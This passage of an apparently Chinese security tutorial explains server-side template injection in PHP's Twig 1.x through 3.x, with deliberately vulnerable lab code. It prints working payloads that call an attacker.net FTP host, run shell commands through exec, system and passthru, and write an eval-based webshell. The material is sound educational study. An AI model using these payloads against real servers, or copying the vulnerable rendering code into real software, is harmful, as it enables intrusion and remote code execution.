<h4 id="ä»£ç ç¤ºä¾‹"><a href="#ä»£ç ç¤ºä¾‹" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a>ä»£ç ç¤ºä¾‹</h4><p>â€‹	åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªindex.phpæ–‡ä»¶ï¼Œå¹¶é”®å…¥å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// å¼•å…¥ Twig è‡ªåŠ¨åŠ è½½å™¨</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨å†Œ Twig è‡ªåŠ¨åŠ è½½å™¨</span></span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºåŸºäºå†…å­˜çš„æ¨¡æ¿åŠ è½½å™¨ï¼ˆåŠ è½½ä¸€ä¸ªåä¸º &#x27;index&#x27; çš„æ¨¡æ¿ï¼‰</span></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">Twig_Loader_Array</span>(<span class="keyword">array</span>( </span><br><span class="line">    <span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;Hello &#123;&#123; name &#125;&#125;!&#x27;</span>, <span class="comment">// æ¨¡æ¿å†…å®¹ï¼Œä½¿ç”¨ Twig æ¨¡æ¿è¯­æ³•</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»º Twig ç¯å¢ƒå®ä¾‹</span></span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸²æŸ“ &#x27;index&#x27; æ¨¡æ¿å¹¶ä¼ é€’å˜é‡</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;World&#x27;</span>)); <span class="comment">// è¾“å‡º &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	éšåè®¿é—®<a target="_blank" rel="noopener" href="http://twig1.localhost/test.php%EF%BC%8C%E4%BD%A0%E5%B0%86%E7%9C%8B%E5%88%B0**Hello">http://twig1.localhost/test.phpï¼Œä½ å°†çœ‹åˆ°**Hello</a> World!**</p>
<p>â€‹	Twig æ¨¡æ¿æ³¨å…¥ä¹Ÿæ˜¯å‘ç”Ÿåœ¨ç›´æ¥å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡æ¿ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// å¼•å…¥ Twig è‡ªåŠ¨åŠ è½½å™¨</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨å†Œ Twig è‡ªåŠ¨åŠ è½½å™¨</span></span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºå­—ç¬¦ä¸²æ¨¡æ¿åŠ è½½å™¨ï¼ˆå…è®¸ç›´æ¥æ¸²æŸ“å­—ç¬¦ä¸²æ¨¡æ¿ï¼‰</span></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ– Twig ç¯å¢ƒ</span></span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›´æ¥æ¸²æŸ“æ¥è‡ª GET å‚æ•° &#x27;name&#x27; çš„æ¨¡æ¿å†…å®¹</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// åŠ¨æ€æ‰§è¡Œç”¨æˆ·è¾“å…¥çš„ Twig æ¨¡æ¿ä»£ç </span></span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨é“¾è§£æ"><a href="#åˆ©ç”¨é“¾è§£æ" class="headerlink" title="åˆ©ç”¨é“¾è§£æ"></a>åˆ©ç”¨é“¾è§£æ</h4><p>â€‹	åœ¨ Twig 1.x ä¸­å­˜åœ¨ä¸‰ä¸ªå…¨å±€å˜é‡ï¼š</p>
<blockquote>
<ul>
<li><code>_self</code>ï¼šå¼•ç”¨å½“å‰æ¨¡æ¿çš„å®ä¾‹ã€‚</li>
<li><code>_context</code>ï¼šå¼•ç”¨å½“å‰ä¸Šä¸‹æ–‡ã€‚</li>
<li><code>_charset</code>ï¼šå¼•ç”¨å½“å‰å­—ç¬¦é›†ã€‚</li>
</ul>
</blockquote>
<p>â€‹	å¯¹åº”çš„ä»£ç åœ¨<code>Twig-1.16.1\lib\Twig\Node\Expression\Name.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$specialVars</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;_self&#x27;</span>    =&gt; <span class="string">&#x27;$this&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_context&#x27;</span> =&gt; <span class="string">&#x27;$context&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_charset&#x27;</span> =&gt; <span class="string">&#x27;$this-&gt;env-&gt;getCharset()&#x27;</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>â€‹	å½“æ¨¡æ¿ä»£ç ä¸­ä½¿ç”¨ <code>_self</code> å˜é‡æ—¶ï¼Œå®ƒä¼šè¿”å›å½“å‰çš„ <code>\Twig\Template</code> å®ä¾‹ã€‚è¿™ä¸ªå®ä¾‹å¯¹è±¡åŒ…å«äº†ä¸€ä¸ªæŒ‡å‘ <code>Twig_Environment</code> çš„ <code>env</code> å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒç»§ç»­è°ƒç”¨ <code>Twig_Environment</code> ä¸­çš„å…¶ä»–æ–¹æ³•ã€‚å› æ­¤ï¼Œé€šè¿‡åœ¨æ¨¡æ¿ä»£ç ä¸­ä½¿ç”¨ <code>_self</code> å˜é‡å’Œ <code>env</code> å±æ€§ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä»»æ„ä»£ç æ‰§è¡Œçš„æ”»å‡»è½½è·ï¼Œä»è€Œè¿›è¡Œ SSTI æ”»å‡»ã€‚</p>
<p>â€‹	ä¾‹å¦‚è¯¥Payload å¯ä»¥è°ƒç”¨ <code>setCache</code> æ–¹æ³•æ”¹å˜ Twig åŠ è½½ PHP æ–‡ä»¶çš„è·¯å¾„ï¼Œåœ¨ <code>allow_url_include</code> å¼€å¯çš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”¹å˜è·¯å¾„å®ç°è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.setCache(<span class="string">&quot;ftp://attacker.net:21&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoor&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	æˆ‘ä»¬åœ¨Twig-1.16.1\lib\Twig\Environment.phpæ–‡ä»¶ä¸­è¿˜æœ‰ <code>getFilter</code> æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;filterCallbacks <span class="keyword">as</span> <span class="variable">$callback</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$filter</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$callback</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹	è€Œåœ¨è¯¥æ–¹æ³•ä¸­æˆ‘ä»¬å‘ç°äº†å±é™©å‡½æ•°<code>call_usr_func</code>é€šè¿‡ä¼ é€’å‚æ•°åˆ°è¯¥å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ PHP å‡½æ•°ã€‚å› æ­¤æœ‰å¦‚ä¸‹åˆ©ç”¨æ–¹æ³•ï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;calc&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Twig-2-x-3-x"><a href="#Twig-2-x-3-x" class="headerlink" title="Twig 2.x &#x2F; 3.x"></a>Twig 2.x &#x2F; 3.x</h3><h4 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>â€‹	ä»<a target="_blank" rel="noopener" href="https://github.com/twigphp/Twig/tree/v2.14.9%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E5%90%8E%E8%A7%A3%E5%8E%8B%E5%88%B0PHPstudy%E7%9A%84WWW%E7%9B%AE%E5%BD%95%E7%9A%84%E5%90%8C%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E5%B9%B6%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E8%AE%A9%E4%BB%96%E8%A7%A3%E6%9E%90%EF%BC%8C%E5%85%B7%E4%BD%93%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/twigphp/Twig/tree/v2.14.9ä¸­ä¸‹è½½æºç åè§£å‹åˆ°PHPstudyçš„WWWç›®å½•çš„åŒä¸€çº§ç›®å½•ä¸‹ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªç½‘ç«™è®©ä»–è§£æï¼Œå…·ä½“è®¾ç½®å¦‚ä¸‹ï¼š</a></p>
<p><img src="/img/PHP-ssti-Twig/image-20250303160849594.png" alt="image-20250303160849594"></p>
<h4 id="ä»£ç ç¤ºä¾‹-1"><a href="#ä»£ç ç¤ºä¾‹-1" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a>ä»£ç ç¤ºä¾‹</h4><p>â€‹	åœ¨index.phpä¸­é”®å…¥å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\ArrayLoader</span>();</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">createTemplate</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure>

<p>â€‹	è®¿é—®å¦‚ä¸‹é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="http://twig2.localhost/?name=world%E4%BD%A0%E5%B0%86%E7%9C%8B%E5%88%B0%60Hello">http://twig2.localhost/?name=worldä½ å°†çœ‹åˆ°`Hello</a> world!&#96;</p>
<p>â€‹	ä¸Šè¿°ç¤ºä¾‹æ˜¯ä¸€ä¸ªå­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´çš„ç¤ºä¾‹ï¼Œåˆ°äº† Twig 2.x &#x2F; 3.x ç‰ˆæœ¬ä¸­ï¼Œ<code>__self</code> å˜é‡åœ¨ SSTI ä¸­æ—©å·²å¤±å»äº†ä»–çš„ä½œç”¨ï¼Œä½†æˆ‘ä»¬å¯ä»¥å€ŸåŠ©æ–°ç‰ˆæœ¬ä¸­çš„ä¸€äº›è¿‡æ»¤å™¨å®ç°ç›®çš„ã€‚</p>
<h5 id="mapè¿‡æ»¤å™¨"><a href="#mapè¿‡æ»¤å™¨" class="headerlink" title="mapè¿‡æ»¤å™¨"></a>mapè¿‡æ»¤å™¨</h5><p>â€‹	åœ¨ Twig ä¸­ï¼Œ<code>map</code> è¿™ä¸ªè¿‡æ»¤å™¨å¯ä»¥å…è®¸ç”¨æˆ·ä¼ é€’ä¸€ä¸ªç®­å¤´å‡½æ•°ï¼Œå¹¶å°†è¿™ä¸ªç®­å¤´å‡½æ•°åº”ç”¨äºåºåˆ—æˆ–æ˜ å°„çš„å…ƒç´ ï¼Œç¤ºä¾‹æ¨¡æ¿æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<h6 id="map-html-twig"><a href="#map-html-twig" class="headerlink" title="map.html.twig"></a><code>map.html.twig</code></h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> people = [</span><br><span class="line">    &#123;first: <span class="string">&quot;Bob&quot;</span>, last: <span class="string">&quot;Smith&quot;</span>&#125;,</span><br><span class="line">    &#123;first: <span class="string">&quot;Alice&quot;</span>, last: <span class="string">&quot;Dupond&quot;</span>&#125;,</span><br><span class="line">] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; people<span class="punctuation">|</span><span class="keyword">map</span>(p =&gt; <span class="string">&quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> people = &#123;</span><br><span class="line">    <span class="string">&quot;Bob&quot;</span>: <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Alice&quot;</span>: <span class="string">&quot;Dupond&quot;</span>,</span><br><span class="line">&#125; <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; people<span class="punctuation">|</span><span class="keyword">map</span>((last, first) =&gt; <span class="string">&quot;#&#123;first&#125; #&#123;last&#125;&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	ä½¿ç”¨å¦‚ä¸‹PHPæ–‡ä»¶è°ƒç”¨å¹¶æ¸²æŸ“è¯¥æ¨¡æ¿ï¼š</p>
<h6 id="map-php"><a href="#map-php" class="headerlink" title="map.php"></a><code>map.php</code></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\FilesystemLoader</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸²æŸ“æ¨¡æ¿</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="string">&#x27;map.html.twig&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure>

<h6 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">your_project/</span><br><span class="line">â”œâ”€â”€ templates/</span><br><span class="line">â”‚   â””â”€â”€ map.html.twig</span><br><span class="line">â””â”€â”€ map.php</span><br></pre></td></tr></table></figure>

<p>â€‹	è®¿é—®åä½ å°†å¾—åˆ°è¾“å‡ºï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bob Smith, Alice Dupond</span><br><span class="line">Bob Smith, Alice Dupond</span><br></pre></td></tr></table></figure>

<h6 id="åˆ©ç”¨è§£æ"><a href="#åˆ©ç”¨è§£æ" class="headerlink" title="åˆ©ç”¨è§£æ"></a>åˆ©ç”¨è§£æ</h6><p>â€‹	å½“æˆ‘ä»¬å¦‚ä¸‹ä½¿ç”¨ <code>map</code> æ—¶ï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&quot;Mark&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>((arg)=&gt;<span class="string">&quot;Hello #&#123;arg&#125;!&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	Twig ä¼šå°†å…¶ç¼–è¯‘æˆï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">twig_array_map</span>([<span class="number">0</span> =&gt; <span class="string">&quot;Mark&quot;</span>], function (<span class="variable">$__arg__</span>) <span class="keyword">use</span> ($<span class="title">context</span>, $<span class="title">macros</span>) &#123; </span><br><span class="line">    $<span class="title">context</span>[&quot;<span class="title">arg</span>&quot;] = $<span class="title">__arg__</span>; <span class="keyword">return</span> (<span class="string">&quot;hello &quot;</span> . (<span class="variable">$context</span>[<span class="string">&quot;arg&quot;</span>] ?? <span class="literal">null</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>â€‹	è¿™ä¸ª <code>twig_array_map</code> å‡½æ•°çš„æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_map</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="variable">$r</span>[<span class="variable">$k</span>] = <span class="variable">$arrow</span>(<span class="variable">$v</span>, <span class="variable">$k</span>);    <span class="comment">// ç›´æ¥å°† $arrow å½“åšå‡½æ•°æ‰§è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹	å…³é”®éƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span>[<span class="variable">$k</span>] = <span class="variable">$arrow</span>(<span class="variable">$v</span>, <span class="variable">$k</span>);    	</span><br></pre></td></tr></table></figure>

<p>â€‹	ä»ä¸Šé¢çš„ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¼ å…¥çš„ <code>$arrow</code> ç›´æ¥å°±è¢«å½“æˆå‡½æ•°æ‰§è¡Œï¼Œå³ <code>$arrow($v, $k)</code>ï¼Œè€Œ <code>$v</code> å’Œ <code>$k</code> åˆ†åˆ«æ˜¯ <code>$array</code> ä¸­çš„ value å’Œ keyã€‚<code>$array</code> å’Œ <code>$arrow</code> éƒ½æ˜¯æˆ‘ä»¬æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä¸ä¼ ç®­å¤´å‡½æ•°ï¼Œç›´æ¥ä¼ ä¸€ä¸ªå¯ä¼ å…¥ä¸¤ä¸ªå‚æ•°çš„ã€èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„å±é™©å‡½æ•°åå³å¯å®ç°å‘½ä»¤æ‰§è¡Œã€‚é€šè¿‡æŸ¥é˜…å¸¸è§çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] ) : <span class="keyword">string</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br><span class="line"><span class="title function_ invoke__">exec</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">array</span> &amp;<span class="variable">$output</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ]] ) : <span class="keyword">string</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span> ( <span class="keyword">string</span> <span class="variable">$cmd</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>

<p>â€‹	å‰ä¸‰ä¸ªéƒ½å¯ä»¥ä½¿ç”¨ã€‚ç›¸åº”çš„ Payload å¦‚ä¸‹ï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&quot;calc&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="language-xml">    // æ— å›æ˜¾</span></span><br></pre></td></tr></table></figure>

<p>â€‹	å…¶ä¸­ï¼Œ<code>&#123;&#123;["calc"]|map("system")&#125;&#125;</code> ä¼šè¢«è§£ææˆä¸‹é¢è¿™æ ·ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">twig_array_map</span>([<span class="number">0</span> =&gt; <span class="string">&quot;calc&quot;</span>], <span class="string">&quot;sysetm&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>â€‹	æœ€ç»ˆåœ¨ <code>twig_array_map</code> å‡½æ•°ä¸­å°†æ‰§è¡Œ <code>system(&#39;calc&#39;,0)</code>ã€‚æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/img/PHP-ssti-Twig/image-20250303163507917.png" alt="image-20250303163507917"></p>
<p>â€‹	å¦‚æœä¸Šé¢è¿™äº›å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«ç¦ç”¨äº†ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ‰§è¡Œå…¶ä»–å‡½æ•°æ‰§è¡Œä»»æ„ä»£ç </p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&quot;phpinfo();&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;eval&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();eval($_POST[&#x27;cmd&#x27;])&quot;</span>:<span class="string">&quot;webç›®å½•&quot;</span>&#125;<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><span class="language-xml">    // å†™ Webshell</span></span><br></pre></td></tr></table></figure>

<p>â€‹	æŒ‰ç…§ <code>map</code> çš„åˆ©ç”¨æ€è·¯ï¼Œæˆ‘ä»¬å»æ‰¾å¸¦æœ‰ <code>$arrow</code> å‚æ•°çš„ï¼Œå¯ä»¥å‘ç°ä¸‹é¢å‡ ä¸ªè¿‡æ»¤å™¨ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚</p>
